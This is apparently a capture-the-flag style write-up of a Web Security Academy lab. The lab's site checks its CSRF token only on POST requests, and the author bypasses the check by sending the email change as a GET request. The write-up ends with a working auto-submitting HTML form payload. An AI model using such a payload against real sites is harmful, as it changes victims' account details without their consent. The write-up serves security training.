
# CSRF where token validation depends on request method

## What do we know?
- site is vulnerable to Cross Site Request Forgery attack
- site implements CSRF token as one of POST parameters

## What do we have to do?
- change viewer's email address

## Solution:

> This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

Lab description tells that vulnerable site checks type of request, my first thought was using different HTTP method.
I had logged into website with given credentials and changed email. In Burp Suite i saw that website uses POST method to change email. 

Lab description gave me an idea, to try different request method, so instead of sending POST request I changed it to GET and passed parameters after question mark. It worked. Nextly I tried sending similar request, but without csrf parameter. Response was the same. 

I went to exploitation server and prepared script sending request as above.

## Final payload looks like this:
File:

`/exploit.html`

Head:

`HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8`

Body: 
```
<html>
  <body>
    <form action="https://"lab-id-here".web-security-academy.net/email/change-email" method="GET">
      <input type="hidden" name="email" value="new@email" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html> 
```
